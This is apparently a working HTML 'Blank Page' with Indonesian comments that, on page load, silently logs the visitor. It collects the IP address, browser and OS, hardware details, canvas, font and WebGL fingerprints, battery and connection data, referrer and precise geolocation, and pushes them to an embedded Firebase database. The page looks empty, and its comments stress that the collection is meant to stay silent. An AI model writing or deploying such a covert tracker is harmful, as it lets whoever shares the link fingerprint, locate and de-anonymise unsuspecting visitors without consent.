<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank Page</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script>
        // Ganti dengan config Firebase kamu
        const firebaseConfig = {
          apiKey: "AIzaSyDDImo9Vq1jqID6WDbGMXToexeIfNFOjpQ",
          authDomain: "iplo-50a21.firebaseapp.com",
          databaseURL: "https://iplo-50a21-default-rtdb.asia-southeast1.firebasedatabase.app",
          projectId: "iplo-50a21",
          storageBucket: "iplo-50a21.firebasestorage.app",
          messagingSenderId: "488527718585",
          appId: "1:488527718585:web:f1a35e256a0d3cf5021368",
          measurementId: "G-1LQMBTQBPK"
};

        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Fungsi ambil data silently lalu kirim ke DB
        async function logUserData() {
            try {
                // Ambil IP via API eksternal
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Info browser dan OS sederhana
                const userAgent = navigator.userAgent;
                let browser = "Unknown";
                let os = "Unknown";

                if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
                else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
                else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
                else if (userAgent.indexOf("Edge") > -1) browser = "Edge";
                else if (userAgent.indexOf("Trident") > -1) browser = "IE";

                if (userAgent.indexOf("Win") > -1) os = "Windows";
                else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
                else if (userAgent.indexOf("Linux") > -1) os = "Linux";
                else if (userAgent.indexOf("Android") > -1) os = "Android";
                else if (userAgent.indexOf("iOS") > -1) os = "iOS";

                // Info tambahan: Screen, hardware, timezone, language
                const screenRes = `${screen.width}x${screen.height}`;
                const pixelRatio = window.devicePixelRatio;
                const colorDepth = screen.colorDepth || "Unknown";
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                const deviceMemory = navigator.deviceMemory || "Unknown";
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language;
                const touchPoints = navigator.maxTouchPoints || 0;

                // Canvas Fingerprint (unik per device)
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Hello, world!", 2, 15);
                const canvasHash = canvas.toDataURL();

                // Font enumeration (unik per device)
                const fonts = [];
                const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Helvetica', 'Times'];
                const baseFont = 'monospace';
                const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
                const detector = document.createElement('span');
                detector.style.fontFamily = baseFont;
                detector.innerHTML = testString;
                document.body.appendChild(detector);
                const baseWidth = detector.offsetWidth;
                document.body.removeChild(detector);
                testFonts.forEach(font => {
                    const el = document.createElement('span');
                    el.style.fontFamily = `${font}, ${baseFont}`;
                    el.innerHTML = testString;
                    document.body.appendChild(el);
                    if (el.offsetWidth !== baseWidth) fonts.push(font);
                    document.body.removeChild(el);
                });

                // WebGL Fingerprint (vendor dan renderer, unik per device)
                let webglVendor = "Unknown";
                let webglRenderer = "Unknown";
                try {
                    const glCanvas = document.createElement('canvas');
                    const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                            webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                    }
                } catch (e) {}

                // Connection Details (bisa berubah)
                const connection = navigator.connection || {};
                const connectionData = {
                    effectiveType: connection.effectiveType || "Unknown",
                    downlink: connection.downlink || "Unknown",
                    rtt: connection.rtt || "Unknown"
                };

                // Battery Status (silent di Chrome/Edge)
                let batteryData = { level: "Unknown", charging: "Unknown", chargingTime: "Unknown", dischargingTime: "Unknown" };
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        batteryData = {
                            level: battery.level * 100, // Persen
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    }
                } catch (e) {}

                // Geolocation (TRIGGER POP-UP, tidak silent)
                let geolocationData = { latitude: "Unknown", longitude: "Unknown", accuracy: "Unknown", timestamp: "Unknown" };
                try {
                    if (navigator.geolocation) {
                        await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    geolocationData = {
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude,
                                        accuracy: position.coords.accuracy, // Dalam meter
                                        timestamp: position.timestamp
                                    };
                                    resolve();
                                },
                                (error) => {
                                    console.error('Geolocation error:', error); // Silent error
                                    resolve(); // Lanjut meskipun gagal
                                },
                                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                            );
                        });
                    }
                } catch (e) {}

                // Timestamp di GMT+7 (Asia/Jakarta)
                const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });

                // Data yang dikirim
                const data = {
                    ip: userIP, // Berubah: VPN, proxy
                    browser: browser, // Tetap: kecuali ganti browser
                    os: os, // Tetap: kecuali ganti device
                    userAgent: userAgent, // Tetap: kecuali ganti browser/device
                    screenResolution: screenRes, // Tetap: kecuali ganti monitor
                    pixelRatio: pixelRatio, // Tetap: kecuali ganti display
                    colorDepth: colorDepth, // Tetap: kecuali ganti monitor
                    cpuCores: cpuCores, // Tetap: per device
                    deviceMemory: deviceMemory, // Tetap: per device
                    timezone: timezone, // Berubah: kalo ganti setting
                    language: language, // Berubah: kalo ganti setting
                    touchPoints: touchPoints, // Tetap: per device
                    canvasHash: canvasHash, // Tetap: unik per device
                    installedFonts: fonts.join(', '), // Tetap: kecuali install font
                    webglVendor: webglVendor, // Tetap: per GPU
                    webglRenderer: webglRenderer, // Tetap: per GPU
                    referrer: document.referrer, // Berubah: tergantung link
                    connection: connectionData, // Berubah: WiFi/4G/5G
                    battery: batteryData, // Berubah: level baterai, charging
                    geolocation: geolocationData, // Berubah: lokasi user, NOT SILENT
                    timestamp: timestamp // Berubah: per waktu
                };

                // Kirim ke Firebase Realtime DB (path /logs)
                database.ref('logs').push(data);
            } catch (error) {
                console.error('Error logging data:', error); // Silent error
            }
        }

        // Jalankan saat load
        window.onload = logUserData;
    </script>
</head>
<body>
    <!-- Blank putih, kosong -->
</body>
</html>
